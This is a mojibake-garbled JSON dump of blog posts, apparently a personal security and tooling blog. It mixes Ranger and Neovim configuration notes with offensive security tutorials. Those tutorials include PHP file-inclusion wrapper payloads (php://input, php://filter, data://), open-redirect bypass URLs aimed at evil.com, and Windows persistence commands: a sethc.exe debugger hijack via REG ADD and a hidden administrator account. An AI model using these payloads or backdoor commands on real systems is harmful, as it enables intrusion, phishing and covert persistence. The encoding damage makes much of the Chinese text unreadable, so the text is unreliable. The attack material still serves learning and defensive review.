æ§åˆ¶çš„ï¼Œé‚£ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥åœ¨ URL è®¿é—®çš„å‚æ•°ä¸­å†™ä¸Š123index.php?file=php://# ç„¶åPOSTåŒ…å†…å®¹å†™ä¸Š&lt;?php phpinfo()?&gt; å®˜æ–¹å¯¹ php://input çš„è¯´æ˜ä¸­ï¼Œåå¤æåˆ°ç¯å¢ƒå˜é‡$HTTP_RAW_POST_DATA ï¼Œè¿™ä¸ªå˜é‡å…¶å®å’Œ file_get_contents(php://input) çš„å†…å®¹æ˜¯ä¸€æ ·çš„ã€‚å¦‚æœè¦å¼€å¯è¿™ä¸ªå˜é‡ï¼Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ° always_populate_raw_post_dataè¿™ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ä¸º On ï¼Œç„¶åé‡æ–°å¯åŠ¨ Web æœåŠ¡å™¨ï¼Œå°±å¯ä»¥äº†ã€‚ php://output ä¸ input åŒç†12345&lt;?php$output = fopen(&quot;php://output&quot;, &quot;w&quot;);fwrite($output, &quot;Test-Testinggggg&quot;);fclose($output);?&gt; php://filter (&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ å› ä¸º php://filter ä¹Ÿå¯¹ php.ini ä¸­çš„ä¸¤ä¸ªå‚æ•°ä¸æ•æ„Ÿï¼Œæ‰€ä»¥åœ¨æœ‰æ–‡ä»¶åŒ…å«çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•åœ¨ URL ä¸­ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ 1index.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php php://filter å‚æ•° æè¿° resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ read=&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt; å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš” write=&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt; å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš” &lt;; ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– _write=_ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ å…¶ä¸­ä¸åŒçš„è¿‡æ»¤å™¨æœ‰ php://fd (&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php://fd/3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3 php://memory &amp; php://temp (&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚ data:// åè®® è‡ªPHP&gt;=5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data://æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç  å¯¹ php.ini çš„ä¸¤ä¸ªå‚æ•°æ•æ„Ÿï¼Œéœ€è¦éƒ½æ˜¯ on çš„çŠ¶æ€ å½“ç¡®å®šæœ‰æ–‡ä»¶åŒ…å«çš„æ—¶å€™ï¼Œå¯ä»¥å¦‚ä¸‹ä½¿ç”¨12345# data://text/plain,http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;# data://text/plain;base64,http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b zip:// &amp; bzip2:// &amp; zlib:// åè®® zip:// &amp; bzip2:// &amp; zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šjpg png gif xxx ç­‰ç­‰ å¯¹ php.ini ä¸­çš„ä¸¤ä¸ªå‚æ•°ä¸æ•æ„Ÿ å½“ç¡®å®šå­˜åœ¨æ–‡ä»¶åŒ…å«æ—¶ï¼Œå¦‚ä¸‹ä½¿ç”¨12345678# zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]ï¼ˆ#ç¼–ç ä¸º%23ï¼‰http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\phpinfo.jpg%23phpinfo.txt# compress.bzip2://file.bz2http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\phpinfo.bz2# compress.zlib://file.gzhttp://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\phpinfo.gz phar:// åè®® ç±»ä¼¼ä¸ä¸Šæ–¹æåˆ°çš„ zip:/ å‹ç¼©åè®®ï¼Œphar æ˜¯å½’æ¡£åè®® å½“ç¡®å®šå­˜åœ¨æ–‡ä»¶åŒ…å«æ—¶ï¼Œå¦‚ä¸‹ä½¿ç”¨1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt #å¾…å¤„ç†åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢","link":"/2022/08/21/PHP%20%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/"},{"title":"Ranger Custom Settings","text":"Basic If you want to custom your ranger,you should do the below changes: 12345# In your .zshrcexport RANGER_LOAD_DEFAULT_RC=false# In the consoleranger --copy-config=all then,youâ€™ll see the default configretion in .config/ranger folder,also the rc.conf filename Description rc.conf The ranger configuration rifle.conf The default application to open a file scope.sh Define how to scope a file in ranger commands.py Custom the commands in ranger 1 Tap hjkl can move the cursor Tap HJKL can move the cursor to the history action place Tap [ ] could get into another folder Tap zh or Ctrl+h to turn on/off the hidden files Tap o to sort the files with some rules(we can use oa ob,etcâ€¦) Tap / to search the file in the current folder (We can custom + - to jump to the next result) Tap Shift+s to get into a cursor file Tap yp to copy the filepath to the clipboard Tap cw to rename the file Tap yy to copy a file Tap pp to paste a copied file Tap dd to cut a file Tap dD to delete a file Tap w to get the task board(And tap dd can cancel a task) Tap v to select all the files in the current folder PluginsYou can get the plugins on rangerâ€™s official GitHub page: Ranger Plugins ranger-devicons2This plugin can add some cool icons for the different folders or files You need to install the Nerd-fonts . 123git clone https://github.com/ryanoasis/nerd-fonts.gitcd ./nerd-fonts./install.sh You should change the iterm2(or another console applications) fonts. You should append these lines to the rc.conf file 1default_linemode devicons2 Finally,youâ€™ll get the dope icons","link":"/2022/10/03/Ranger/"},{"title":"URL è·³è½¬æ¼æ´","text":"URL è·³è½¬æ¼æ´0x00.å‚è€ƒæ–‡ç«  https://www.cnblogs.com/linuxsec/articles/10926152.html https://ninjia.gitbook.io/secskill/web/url 0x01.æ¦‚å¿µè¿™ç±»æ¼æ´å±äºä½å±æ¼æ´ï¼Œä½†æ˜¯å¦‚æœæœ‰æ“ä½œæˆ–è®¸å¯ä»¥æ‰“ç»„åˆæ‹³ æ­¤ç±»æ¼æ´ä¼šå‡ºç°åœ¨é€ æˆç½‘é¡µè·³è½¬çš„é¡µé¢ ç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç  æ”¯ä»˜æˆåŠŸè·³å›åŸé¡µ ç”¨æˆ·åˆ†äº«ã€æ”¶è—å†…å®¹è¿‡å è·¨ç«™ç‚¹è®¤è¯ã€æˆæƒå ç«™å†…ç‚¹å‡»å…¶å®ƒç½‘å€é“¾æ¥æ—¶ ç­‰ç­‰ä¸€åˆ‡å¯è·³è½¬çš„é¡µé¢â€¦ åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œç»™å—å®³è€…ä¸€ä¸ªæœ‰è·³è½¬æ¼æ´çš„å®‰å…¨é“¾æ¥ï¼Œç„¶åä¸€ç‚¹å‡»å°±ä¼šè·³åˆ°æˆ‘ä»¬æŒ‡å®šçš„é¡µé¢ï¼Œå¯ä»¥ä½œä¸ºé’“é±¼ä½¿ç”¨ 1http://127.0.0.1/url.php?username=&amp;password=&amp;redict=http://127.0.0.1/fish.php æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è°·æ­Œè¯­æ³•å» fuzz è¦æŸ¥çš„ç½‘ç«™ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465site:baidu.com inurl:ä»¥ä¸‹fuzzå‚æ•°redirect=url=redirectUrl=callback=return_url=toUrl=ReturnUrl=fromUrl=redUrl=request=redirect_to=redirect_url=jump=jump_to=target=to=goto=link=linkto=domain=oauth_callback=login=qurl=logout=data=ext=clickurl=next=callback_url=jump_url=return=click?u=originUrl=Redirect=sp_url=service=rit_url=forward_url=forward=success=recurl=j?url=uri=u=allinurl=q=src=tc?src=linkAddress=location=go=pic=burl=backurl=RedirectUrl=origin=Url=desturl=page=u1=action=action_url=dest= 0x02.å¸¸è§åç«¯ä»£ç å¦‚ä¸‹123456789101112131415161718192021Java:response.sendRedirect(request.getParameter(&quot;url&quot;));PHP:$redirect_url = $_GET['url'];header(&quot;Location: &quot; . $redirect_url);.NET:string redirect_url = request.QueryString[&quot;url&quot;];Response.Redirect(redirect_url);Django:redirect_url = request.GET.get(&quot;url&quot;)HttpResponseRedirect(redirect_url)Flask:redirect_url = request.form['url']redirect(redirect_url)Rails:redirect_to params[:url] 0x03.åˆ©ç”¨ä¸€èˆ¬çš„ç½‘ç«™ redict å‚æ•°åé¢æ˜¯æœ‰ä¸€ä¸ªäººå®¶ç½‘ç«™æ­£è§„çš„è·³è½¬åé“¾æ¥çš„æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨é‚£ä¸ªé“¾æ¥é™„è¿‘åŠ ä¸€äº›æ¶æ„å‚æ•°ï¼Œè®©å…¶è·³åˆ°æˆ‘ä»¬è¦çš„ç½‘ç«™ æœ‰çš„æ—¶å€™ redirct=åé¢çš„å†…å®¹æ˜¯åŠ å¯†çš„ï¼Œç»™è‡ªå·±çš„ payload ä¹ŸåŠ å¯† bypass å³å¯ 1.ç›´æ¥è·³è½¬12www.baidu.com/url.php?username=&amp;password=&amp;redict=www.evil.comç›´æ¥åœ¨è·³è½¬å‚æ•°åé¢å†™è‡ªå·±çš„ç½‘ç«™å°±å¥½äº† 2.åè®®ä¸€è‡´æ€§12www.baidu.com/redirect.php?url=https://www.evil.com/untrust.htmlåŸç½‘ç«™å’Œå³å°†è¦è·³è½¬çš„ç½‘ç«™æœ‰å¿…é¡»åè®®ä¸€è‡´çš„å®¡æŸ¥æœºåˆ¶ 3.åŸŸåæ˜¯å¦åŒ…å«ç™½åå•è¦æ±‚çš„å­—ç¬¦ä¸²ä»£ç  12345678&lt;?php$redirect_url = $_GET['url'];if(strstr($redirect_url,&quot;127.0.0.1&quot;) !== false){ header(&quot;Location: &quot; . $redirect_url);}else{ die(&quot;Forbidden&quot;);} æœ‰çš„æ£€æµ‹åŸŸåç»“å°¾æ˜¯ä¸æ˜¯å½“å‰åŸŸå(Django å®ç°) 12345redirect_url = request.GET.get(&quot;url&quot;)if redirect_url.endswith('landgrey.me'): HttpResponseRedirect(redirect_url)else: HttpResponseRedirect(&quot;https://www.landgrey.me&quot;) æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è¾“å…¥æ¶æ„åŸŸååï¼Œè¡”æ¥æ­£å¸¸åŸŸå1www.baidu.com/redirect.php?url=http://www.evil.com/www.baidu.com æˆ–è€…ç›´æ¥è´­ä¹°æˆ–è°·æ­Œè¯­æ³• inurl æœç´¢ä¸€ä¸ªåŒ…å« baidu çš„åŸŸå1www.baidu.com/redirect.php?url=http://hahabaidu.com å¯ä»¥åˆ©ç”¨å…¬å…±ç™½åå•çš„å¯ä¿¡ç«™ä¾‹å¦‚ google.com æ˜¯å¯ä¿¡ç«™ï¼Œè€Œè°·æ­Œä¸‹æœ‰ä¸ªç¼“å­˜åŠŸèƒ½ 1google.com/linkurl=www.evil.com é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨æœ‰è·³è½¬æ¼æ´çš„ url ååŠ ä¸Šæœ‰æˆ‘ä»¬æ¶æ„é¡µé¢ç¼“å­˜çš„å¯ä¿¡ç«™ urlæ¥è¿›è¡Œç»•è¿‡ 1www.baidu.com/redirect.php?url=google.com/linkurl=www.evil.com å¦‚æœè¦æ±‚åªèƒ½æ˜¯æœ¬ç«™åŸŸï¼Œé‚£ä¹ˆå¯ä»¥æœ¬ç«™å…¶ä»–æœ‰è·³è½¬æ¼æ´çš„ url æ¥å¥—å¨ƒ1www.baidu.com/redirect.php?url=www.baidu.com/redirect.php?url=http://hahabaidu.com 4.åŠ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡è„±ç¦»ä¸äº†è¿™å‡ ä¸ªå­—ç¬¦ï¼š 123456789;/\\?:@=&amp;. ä¾‹å­æ˜¯ï¼š 1www.baidu.com/url.php?username=1&amp;redict=http://www.evil.com@tieba.baidu.com 5.ä¸€äº›å¥‡å¼‚çš„åŸºäºä¸åŒæ¡†æ¶çš„ç»•è¿‡æ³•1234567891011121314# å¾ˆå¤šæ–œæ ã€åæ–œæ ã€ç‚¹å¥‡å¼‚ç»•è¿‡www.baidu.com/url.php?username=1&amp;redict=////www.evil.com/..www.baidu.com/url.php?username=1&amp;redict=\\\\\\\\www.evil.com/..# xip.ioæœåŠ¡ç»•è¿‡ï¼Œ127.0.0.1æ˜¯æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨ipwww.baidu.com/url.php?username=1&amp;redict=http://tieba.baidu.com.127.0.0.1.xip.ioxip.ioç›¸å½“äºå»ºç«‹äº†ä¸ª[[DNS]]è§„åˆ™ï¼Œä¼šå°†å‰é¢çš„åŸŸåå®šå‘åˆ°åé¢çš„ipåœ°å€å¤„# ç¼ºå°‘åè®®çš„ç»•è¿‡www.baidu.com/redirect.php?url=//www.evil.com# åˆ©ç”¨å¥‡æ€ªçš„çš„ç‚¹æ¥ç»•è¿‡www.baidu.com/redirect.php?url=.evil.com 6.å…¶ä»–ç»•è¿‡æ–¹æ³• è·³è½¬åˆ° IP åœ°å€ï¼Œè€Œä¸æ˜¯åŸŸå è·³è½¬åˆ° IPV6 åœ°å€ï¼Œè€Œä¸æ˜¯ IPv4 åœ°å€ å°†è¦è·³è½¬åˆ°çš„ IP åœ°å€ç”¨ 10 è¿›åˆ¶ã€8 è¿›åˆ¶ã€16 è¿›åˆ¶å½¢å¼è¡¨ç¤º æ›´æ¢åè®®,ä½¿ç”¨ ftpã€gopher åè®®ç­‰ å€Ÿé‰´[[SSRF]]æ¼æ´ç»•è¿‡çš„ tricks CRLF æ³¨å…¥ä¸èƒ½ xss æ—¶ï¼Œè½¬å‘åˆ©ç”¨ä»»æ„ URL è·³è½¬æ¼æ´","link":"/2020/09/09/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"title":"Neovim, my favourite editor!","text":"Some hotkey to operate vimUse vim-plug in neovim The neovim config file is in ~/.config/nvim/init.vimwwe should create two directory ~/.config/nvim/autoload ~/.config/nvim/plugged 1mkdir -p ~/.config/nvim/autoload ~/.config/nvim/plugged 12# Download vim-plugcurl -fLo ~/.config/nvim/autoload/plug.vim https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim Append new lines in vim config file(Neovim is in ~/.config/nvim/init.vim) 123call plug#begin('~/.config/nvim/plugged')Plug 'vim-airline/vim-airline'call plug#end() Then,reload the config file,change vim to the command mode, tap these 1:PlugInstall And you have completely installed the vim-plug Single option to edit Command a could get into the insert mode after the current character. Command Shift + a could get into the insert mode at the last of the current line. The command i could get into the insert mode before the current character. Command Shift+ i could get into the insert mode at the begin of the current line. Command o could get into the insert mode at the next line beginning. Command Shift+o could get into the insert mode at the previous line beginning. Command u could undo the previous actoin. We can use &quot; to comment the vimrc In the command mode,keyword % means the current file itself. We can use $ to move the cursor to the end of a line 1&lt;operation&gt; &lt;motion&gt; # The command format is Kind of this mode d command is the delete keyWhen we use d+Right+3,means delete 3 letters on the right side Tap: set spellï¼Œthe incorrect syntax will be found. choose a incorrect word,tapz=,then,you will find lots of words advice from vim. When you jump to another place,you want to go back to the previous code block,you could use Ctrl + o,also,you could use Ctrl + i to go back again When your cursor is on a filepathï¼Œtap gf to open it within the current window(then you can also tap Ctrl + o to go back to the previous file) â­ï¸Tip oneIf you are editing a /etcfile but donâ€™t have the root privilege,and exit will lose the contents forever.Then you can tap these commands to save your data 1: w !sudo tee % then you input some enter will be rightAttention: this command is perfect to run in vim,but not neovim â­ï¸Tip twowe can append a rule in vimrc,like 1map \\&lt;LEADER&gt;\\&lt;LEADER&gt; \\&lt;Esc&gt;/&lt;++&gt;\\&lt;CR&gt;: nohlsearch\\&lt;CR&gt;c4l From now on,if we write &lt;++&gt; in a file,then we tap double spaces we can change new characters replacing the previous one. â­ï¸Tip threea combo with figlet install the figlet(brew install figlet) tap these commands to insert a figlet words into the file 1: r !figlet NICE then weâ€™ll get this one â­ï¸Tip fourprint the vim file into the HTML format (will open another vim window) 1%TOhtml when we tap wq in the new genarete file,we can open it with the browser Edit the vimrcUse map to custom the keybindCustom setting12345678910111213141516171819202122232425262728# increase the line numberset number# syntax highlightingsyntax on# add a underline on current editing lineset cursorline# use Tab to complete the commandset wildmenu# make text auto fit current windowset wrap# make your vim adapted with the elder versionset nocompatible# custom the indent(when you use python or other language),There must be no spaces around the &quot;=&quot;set tabstop=2set shiftwidth=2set softtabstop=2# make your editing line always keep the medium of your screenset scrolloff=5# use the option,we could restore the editing position latest edited when we open the file again next timeau BufReadPost * if line(&quot;'\\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;'\\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g'\\&quot;&quot; | endif map123456789# tap j,means kmap j k# tap Ctrl+sï¼Œmeans :wq+entermap &lt;C-s&gt; :wq&lt;CR&gt;# deny the recursive querynoremap j k Special keys 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859notation meaning equivalent decimal value(s)-----------------------------------------------------------------------&lt;Nul&gt; zero CTRL-@ 0 (stored as 10) &lt;Nul&gt;&lt;BS&gt; backspace CTRL-H 8 backspace&lt;Tab&gt; tab CTRL-I 9 tab Tab linefeed&lt;NL&gt; linefeed CTRL-J 10 (used for &lt;Nul&gt;)&lt;FF&gt; formfeed CTRL-L 12 formfeed&lt;CR&gt; carriage return CTRL-M 13 carriage-return&lt;Return&gt; same as &lt;CR&gt; &lt;Return&gt;&lt;Enter&gt; same as &lt;CR&gt; &lt;Enter&gt;&lt;Esc&gt; escape CTRL-[ 27 escape &lt;Esc&gt;&lt;Space&gt; space 32 space&lt;lt&gt; less-than &lt; 60 &lt;lt&gt;&lt;Bslash&gt; backslash \\ 92 backslash &lt;Bslash&gt;&lt;Bar&gt; vertical bar | 124 &lt;Bar&gt;&lt;Del&gt; delete 127&lt;CSI&gt; command sequence intro ALT-Esc 155 &lt;CSI&gt;&lt;xCSI&gt; CSI when typed in the GUI &lt;xCSI&gt;&lt;EOL&gt; end-of-line (can be &lt;CR&gt;, &lt;LF&gt; or &lt;CR&gt;&lt;LF&gt;, depends on system and 'fileformat') &lt;EOL&gt;&lt;Up&gt; cursor-up cursor-up cursor_up&lt;Down&gt; cursor-down cursor-down cursor_down&lt;Left&gt; cursor-left cursor-left cursor_left&lt;Right&gt; cursor-right cursor-right cursor_right&lt;S-Up&gt; shift-cursor-up&lt;S-Down&gt; shift-cursor-down&lt;S-Left&gt; shift-cursor-left&lt;S-Right&gt; shift-cursor-right&lt;C-Left&gt; control-cursor-left&lt;C-Right&gt; control-cursor-right&lt;F1&gt; - &lt;F12&gt; function keys 1 to 12 function_key function-key&lt;S-F1&gt; - &lt;S-F12&gt; shift-function keys 1 to 12 &lt;S-F1&gt;&lt;Help&gt; help key&lt;Undo&gt; undo key&lt;Insert&gt; insert key&lt;Home&gt; home home&lt;End&gt; end end&lt;PageUp&gt; page-up page_up page-up&lt;PageDown&gt; page-down page_down page-down&lt;kHome&gt; keypad home (upper left) keypad-home&lt;kEnd&gt; keypad end (lower left) keypad-end&lt;kPageUp&gt; keypad page-up (upper right) keypad-page-up&lt;kPageDown&gt; keypad page-down (lower right) keypad-page-down&lt;kPlus&gt; keypad + keypad-plus&lt;kMinus&gt; keypad - keypad-minus&lt;kMultiply&gt; keypad * keypad-multiply&lt;kDivide&gt; keypad / keypad-divide&lt;kEnter&gt; keypad Enter keypad-enter&lt;kPoint&gt; keypad Decimal point keypad-point&lt;k0&gt; - &lt;k9&gt; keypad 0 to 9 keypad-0 keypad-9&lt;S-...&gt; shift-key shift &lt;S-&lt;C-...&gt; control-key control ctrl &lt;C-&lt;M-...&gt; alt-key or meta-key meta alt &lt;M-&lt;A-...&gt; same as &lt;M-...&gt; &lt;A-&lt;D-...&gt; command-key (Macintosh only) &lt;D-&lt;t_xx&gt; key with &quot;xx&quot; entry in termcap Split your vim workspaceEdit the vim config file~/.config/nvim/init.vim,then append these configurations 12345678910111213141516# set a mapleader keylet mapleader = &quot; &quot;# horizontal split your vim workspacemap `h :set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;map `l :set splitright&lt;CR&gt;:vsplit&lt;CR&gt;# vertical split your vim workspacemap `j :set nosplitbelow&lt;CR&gt;:split&lt;CR&gt;map `k :set splitbelow&lt;CR&gt;:split&lt;CR&gt;# move your cursor to the other workspacemap &lt;LEADER&gt;h &lt;C-w&gt;hmap &lt;LEADER&gt;j &lt;C-w&gt;jmap &lt;LEADER&gt;k &lt;C-w&gt;kmap &lt;LEADER&gt;l &lt;C-w&gt;l open another file,we can tap: e ~/try/2.txtto open another file in your vim Vim Tab Manager12345678# create a new tabmap tn :tabe&lt;CR&gt;# previous tabmap th :-tabnext&lt;CR&gt;# next tabmap tl :+tabnext&lt;CR&gt; Recoding a macro Tap q ,then Tap a Character you want,such as a Vim will recode a macro marked with a Do anything you want. Tap @ + a will execute the macro VISUAL LINEV-LINE modeTap the Shift+v could get into the V-LINE mode,and we could batch operate these lines. then,Tap the : ,we could input the batch operate the lines 123# Append 2022- to the beginning of these lines:normal I2022-# Tap the Enter key will see the changing V-BLOCK modeTap the Ctrl+v could get into the V-BLOCK mode,and we could batch operate the selected blocksthen,Tap the : ,we could input the batch operate the lines 12345678# Append 2022- to the beginning of these selected blocksï¼Œand Tap the Enter key will see the changing:normal I2022-# delete All the selected blocksd# edit an area in one line,and take effect to all the lines(Tap Esc to make it effective when you have edited)Shift + i Vim-Plugspreservim/nerdcommenter Use space(My &lt;LEADER&gt;) + cc to add a comment User space(My &lt;LEADER&gt;) + cu to cancel a comment tpope/vim-surround Use cs&quot;' can change the word surrounding become to ' from &quot; Use cs&quot;&lt;q&gt; can change the word surrounding become to &lt;q&gt; from &quot; Use ds&quot;can cancel the word surrounding tmhedberg/SimpylFold Use zo to open a folded code block Use zc to close a fold CoC Use space + r + n to rename a variable mbbill/undotreeAdd a configuration to the init.vim 1nnoremap &lt;C-h&gt; :UndotreeToggle&lt;CR&gt; Use Ctrl + H to open the undotree toggle FzFAdd a configuration to the init.vim 12345678nnoremap &lt;Leader&gt;C :Colors&lt;CR&gt;nnoremap &lt;Leader&gt;b :Buffers&lt;CR&gt;nnoremap &lt;Leader&gt;f :Files&lt;CR&gt;nnoremap &lt;Leader&gt;l :Lines&lt;CR&gt;nnoremap &lt;Leader&gt;ag :Ag &lt;C-R&gt;&lt;C-W&gt;&lt;CR&gt;nnoremap &lt;Leader&gt;AG :Ag &lt;C-R&gt;&lt;C-A&gt;&lt;CR&gt;xnoremap &lt;Leader&gt;ag y:Ag &lt;C-R&gt;&quot;&lt;CR&gt;nnoremap &lt;Leader&gt;` :Marks&lt;CR&gt; Use \\&lt;LEADER&gt; + f to search files NerdTreeAdd a configuration to the init.vim 1nnoremap &lt;C-f&gt; :NERDTreeFind&lt;CR&gt; Use Ctrl + f to open the NerdTree mhinz/vim-startifyJust install the pluggin is well mg979/vim-visual-multi When you cursor a word,tap Ctrl + n to select a word and get into the visual-multi mode Then you can change them batching","link":"/2022/06/23/Vim/"},{"title":"Windows å…³é”®æ–‡ä»¶å®‰å…¨æ€§æ’æŸ¥(çº¢è“å¯¹æŠ—)","text":"å‚è€ƒæ–‡ç«  windows å¸¸è§ backdoorã€æƒé™ç»´æŒæ–¹æ³•åŠæ’æŸ¥æŠ€æœ¯ ç³»ç»Ÿå·¥å…·æ›¿æ¢åé—¨æ’æŸ¥ï¼šautoruns å·¥å…·ï¼Œä¸‹è½½åœ°å€ï¼š Autoruns for Windows v13.98æ­¤åé—¨æ˜“è¢«æ£€æµ‹ç±»ä¼¼å¯è¢«æ›¿æ¢çš„ç¨‹åºæœ‰ï¼š osk.exe Narrator.exe Magnify.exe [[utilman]]è¾…åŠ©å·¥å…·ç®¡ç†å™¨![[utilman]] sethc.exe è½»æ¾ä½¿ç”¨ç»å…¸çš„ shift åé—¨ ä¿®æ”¹æ³¨å†Œè¡¨ HKEY\\_LOCAL\\_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options ä¸‹ sethc.exeï¼Œæ·»åŠ ä¸€ä¸ª Debugger å­—ç¬¦å€¼ï¼ˆREG_SZï¼‰ï¼Œå¹¶ä¸”èµ‹å€¼ä¸º cmd.exe çš„æ‰§è¡Œè·¯å¾„ä¸º C: \\\\windows\\\\system32\\\\cmd.exe 1REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\\windows\\system32\\cmd.exe&quot; /f è¿™é‡Œæœ‰æ›´é«˜é˜¶çš„ä½¿ç”¨æ–¹æ³•ï¼Œä¸”ä¸ä¼šè¢« autoruns æ£€æµ‹åˆ°ï¼š æ‰“é€ ä¸ä¸€æ ·çš„ Shfit æ˜ åƒåŠ«æŒåé—¨ åé—¨è´¦å· åˆ›å»ºå…‹éš† administrator è´¦å·ï¼Œä¸”é€šè¿‡å‘½ä»¤ net user ä»¥åŠæ§åˆ¶é¢æ¿ä¸­çš„ç®¡ç†è´¦æˆ·æ— æ³•çœ‹åˆ°ã€‚ ![[powershell#ç”¨æˆ·]]1.åˆ›å»ºåé—¨ç”¨æˆ· 123net user defaultuser0$ somepasswordhere /add /ynet localgroup administrators defaultuser0$ /addnet localgroup &quot;remote desktop users&quot; defaultuser0$ /add 2.ä¹‹åå°† administrator ç”¨æˆ·å¯¹åº”çš„ Users ä¸­çš„ F å€¼å¤åˆ¶æ›¿æ¢åé—¨è´¦æˆ·çš„ F å€¼3.å¯¼å‡º User ä¸‹é¢çš„åé—¨è´¦æˆ·ä»¥åŠ name ä¸‹é¢çš„åé—¨è´¦æˆ·ä¸¤ä¸ªæ–‡ä»¶ã€‚4.é€šè¿‡å‘½ä»¤åˆ é™¤åˆšæ‰çš„åé—¨ç”¨æˆ· 1net user defaultuser0$ /del 5.é€šè¿‡æ³¨å†Œè¡¨å¯¼å…¥åˆšæ‰ä¿å­˜çš„ä¸¤ä¸ªæ³¨å†Œè¡¨ å‚è€ƒæ–‡ç«  Windows ç³»ç»Ÿçš„å¸æˆ·éšè— æ˜æ–‡è´¦å·è®°å½• å®‰å…¨æ”¯æŒæä¾›ç¨‹åºï¼ˆSSPï¼‰æ˜¯ Windows APIï¼Œç”¨äºæ‰©å±• Windows èº«ä»½éªŒè¯æœºåˆ¶ã€‚ LSASS è¿›ç¨‹åœ¨ Windows å¯åŠ¨æœŸé—´åŠ è½½å®‰å…¨æ”¯æŒæä¾›ç¨‹åº 